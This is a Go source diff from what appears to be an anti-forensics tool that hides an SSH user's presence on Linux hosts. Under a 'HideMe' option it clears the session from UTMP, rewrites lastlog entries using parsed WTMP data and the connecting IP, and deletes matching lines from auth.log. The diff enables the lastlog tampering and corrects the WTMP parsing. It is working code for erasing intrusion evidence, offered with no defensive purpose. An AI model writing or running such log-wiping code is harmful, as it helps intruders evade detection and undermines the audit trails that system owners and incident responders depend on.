@@ -60,7 +60,7 @@ func init() {
 	flag.BoolVar(&vars.Combo, "c", false, "Combo Entry")
 	flag.BoolVar(&vars.HideMe, "hm", true, "Hide My Shit")
 	flag.StringVar(&vars.BrFile, "f", "", "Data File")
-	flag.StringVar(&vars.Host, "h", "192.168.23.23", "Server Host")
+	// flag.StringVar(&vars.Host, "h", "192.168.23.23", "Server Host")
 	flag.StringVar(&vars.Port, "p", "", "Server Port")
 	flag.StringVar(&vars.User, "u", "", "Server Username")
 	flag.StringVar(&vars.Pass, "pa", "", "Server Pass")
@@ -71,10 +71,14 @@ func init() {
 
 func main() {
 	// history.DelHistory()
+
+	fmt.Println("PRINT WHO")
 	connectedData, _ := getpty.GetConectedData()
 	// fmt.Println(x.Current, "------", x.Parent)
 	fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart)
-	time.Sleep(2 * time.Second)
+
+	time.Sleep(10 * time.Second)
+	fmt.Println("PRINT WHO AGAINE")
 	if true {
 		if vars.HideMe {
 
@@ -86,20 +90,22 @@ func main() {
 				check.Check("Error On parshing UTMP file for EPOCH", err)
 				connectedData.TimeLoginSSHEpoch = myepoch
 				utmp.ClearUTMP(connectedData)
+				fmt.Println(connectedData, "AFINAL FINAL FINAL")
+
+				time.Sleep(5 * time.Second)
+
+				ConvertIPToBytearray(&connectedData.IP)
+				dataToInfl, _ := parceDataWtmpFile(connectedData.User)
+
+				lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &vars.ConnectedUser)
+				fmt.Println("log lastlog END END END ")
 				if false {
-					time.Sleep(5 * time.Second)
-
-					ConvertIPToBytearray(&connectedData.IP)
-					dataToInfl, _ := parceDataUtmpFile(connectedData.User)
-
-					lastlog.ChangeLastLog(&vars.Host, &dataToInfl, &vars.ConnectedUser)
-
 					// /////////////////////////////////////////////////////////////////////////////
 					sessionStart := int(dataToInfl.Time.Sec)
 					sessionStop := int(dataToInfl.TimeEnd.Sec)
 					start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
 					// err := deleteLineAuthLog(AUTH_LOG, start, stop,sIP)
-					sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &vars.Host)
+					sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &connectedData.IP)
 					check.Check("Delete Auth Log ", err)
 					fmt.Println(sessionID)
 
@@ -155,7 +161,7 @@ func ConvertIPToBytearray(ip *string) {
 
 // This fuck checks the WTMP file
 // WTMP holds the last data
-func parceDataUtmpFile(connectedUser string) (vars.DataToInfl, error) {
+func parceDataWtmpFile(connectedUser string) (vars.DataToInfl, error) {
 
 	count = 0
 	// sizeUtmp := int64(binary.Size(Utmp{}))
@@ -200,8 +206,8 @@ func parceDataUtmpFile(connectedUser string) (vars.DataToInfl, error) {
 			if len(DtIN)-1 > -1 {
 				if DtIN[len(DtIN)-1].Pid == record.Pid {
 					fmt.Println("MESA MESA")
-					DtIN[len(DtIN)-1].Time.Sec = record.Time.Sec
-					DtIN[len(DtIN)-1].Time.Usec = record.Time.Usec
+					DtIN[len(DtIN)-1].TimeEnd.Sec = record.Time.Sec
+					DtIN[len(DtIN)-1].TimeEnd.Usec = record.Time.Usec
 				}
 			}
 		}
